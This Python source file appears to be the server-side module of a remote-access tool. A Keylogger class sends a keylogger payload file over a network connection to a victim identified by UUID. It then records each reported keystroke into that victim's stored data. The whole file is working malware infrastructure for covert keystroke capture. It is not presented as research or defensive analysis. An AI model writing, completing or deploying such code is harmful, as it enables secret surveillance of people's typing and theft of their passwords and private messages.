import logging
from dataManager.repository.userRepository import UserRepository

class Keylogger:
    def __init__(self, user_repository: UserRepository):
        self.module_name = "keylogger"
        self.payload_path = "./modules/payload_keylogger.py"
        self.user_repository: UserRepository = user_repository

    async def inject(self, reader, writer, uuid):
        with open(self.payload_path, "rb") as f:
            writer.write(f.read())
            await writer.drain()
            logging.info("Keylogger sent")
            data = await reader.read(4096)
            message = data.decode()
            logging.info(f"Message from {uuid}: {message}")

    async def action(self, message, uuid):
        logging.info(f"Key pressed by {uuid}: {message}")
        keylogger_data = self.user_repository.get_user(uuid).module_data.get(self.module_name, "")
        self.user_repository.set_user_module_data(uuid, self.module_name, keylogger_data + message)